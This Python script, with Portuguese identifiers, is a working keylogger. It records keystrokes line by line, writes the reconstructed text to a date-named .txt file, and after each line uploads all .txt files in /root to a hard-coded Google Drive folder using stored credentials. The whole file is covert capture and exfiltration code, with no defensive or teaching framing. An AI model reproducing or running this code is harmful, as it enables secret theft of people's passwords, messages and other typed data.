import keyboard


def gerar_nome():
    import datetime
    import random
    direita = (
    'breu', 'escuro', 'obscuro', 'trevas', 'sombra', 'caligem', 'neblina', 'blecaute', 'apagao', 'opaco', 'tenebroso')
    name = datetime.date
    name = str(name.today())

    return name + '-' + direita[random.randint(0, 10)]


nome_arquivo = gerar_nome() + '.txt'


def google_drive():
    from pydrive.auth import GoogleAuth
    from pydrive.drive import GoogleDrive
    import os

    gauth = GoogleAuth()
    gauth.LoadCredentialsFile('/etc/atte/credentials.json')
    drive = GoogleDrive(gauth)

    folder = '1OvHDaMSzesRWVOC8seuTu7qVLfkmBiu8'

    diretorio = '/root'

    arquivos = os.listdir(diretorio)

    for arquivo in arquivos:
        if arquivo[-3:] == "txt":
            filename = diretorio + '/' + arquivo
            gfile = drive.CreateFile({'parents': [{'id': folder}], 'title': arquivo})
            gfile.SetContentFile(filename)
            gfile.Upload()


while True:
    frase = ''
    teclas = [[], []]
    t = keyboard.record(until='return')

    for tecla in t:
        convertido = str(tecla)
        filtro = convertido[14:len(convertido) - 1].split()
        if filtro[1] == 'down':
            teclas[0].append(filtro)
        else:
            teclas[1].append(filtro)

    for letra in teclas[0]:
        if letra[0] == 'space':
            frase += ' '
        elif letra[0] == 'backspace':
            frase = frase[0:len(frase) - 1]
        elif letra[0] == 'enter':
            frase += ''
        else:
            frase += letra[0]

    keylog = open(nome_arquivo, "a")
    keylog.write(frase + '\n')
    keylog.close()

    google_drive()
